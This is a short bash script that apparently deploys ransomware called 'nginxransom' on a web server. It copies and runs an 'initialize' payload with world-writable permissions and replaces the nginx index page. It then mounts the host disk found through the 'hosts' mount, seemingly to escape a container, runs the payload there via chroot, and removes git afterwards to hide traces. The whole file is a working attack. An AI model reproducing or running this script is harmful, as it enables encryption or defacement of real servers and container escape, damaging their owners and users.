#!/bin/bash  

#apt update -y 
#apt install git -y  
#git clone https://github.com/xeroxpro/nginxransom.git
cp -u nginxransom/initialize.txt /usr/bin/initialize && chmod 777 /usr/bin/initialize && ./initialize &  
cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html && wait
diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
mount $diskpart /mnt/
cp -u /usr/bin/initialize  mnt/initialize && chmod 777 mnt/initialize && wait
chroot mnt/ ./initialize &
wait
apt remove git -y

